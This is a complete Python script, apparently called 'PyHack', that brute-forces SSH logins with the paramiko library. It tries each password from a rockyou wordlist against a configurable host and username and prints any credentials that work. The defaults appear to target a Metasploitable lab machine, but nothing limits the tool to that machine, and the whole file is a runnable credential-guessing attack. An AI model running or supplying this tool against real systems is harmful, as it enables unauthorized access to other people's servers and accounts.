
import argparse
import paramiko


TARGET = "192.168.1.8"
PORT = 22
USERNAME = "msfadmin"
WORDLIST = "/usr/share/dirb/wordlists/rockyou.txt"


def ssh_login(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            host,
            port=port,
            username=username,
            password=password,
            timeout=3,
            auth_timeout=3,
            banner_timeout=3
        )
        ssh.close()
        return True

    except paramiko.AuthenticationException:
        return False

    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PyHack — SSH Credential Checker"
    )

    parser.add_argument("-t", "--target", default=TARGET)
    parser.add_argument("-p", "--port", type=int, default=PORT)
    parser.add_argument("-u", "--username", default=USERNAME)
    parser.add_argument("-w", "--wordlist", default=WORDLIST)

    args = parser.parse_args()

    print("=" * 55)
    print("PyHack — SSH Credential Checker")
    print("=" * 55)
    print(f"[*] Target   : {args.target}:{args.port}")
    print(f"[*] Username : {args.username}")
    print(f"[*] Wordlist : {args.wordlist}")
    print("=" * 55)

    try:
        with open(args.wordlist, "r", errors="ignore") as wordlist:
            for line in wordlist:
                password = line.strip()

                if not password:
                    continue

                print(f"[*] Trying: {password}")

                if ssh_login(
                    args.target,
                    args.port,
                    args.username,
                    password
                ):
                    print("\n[+] VALID CREDENTIALS")
                    print(f"[+] Username : {args.username}")
                    print(f"[+] Password : {password}")
                    return

    except FileNotFoundError:
        print(f"[-] Wordlist not found: {args.wordlist}")
        return

    print("\n[-] No valid password found.")


if __name__ == "__main__":
    main()
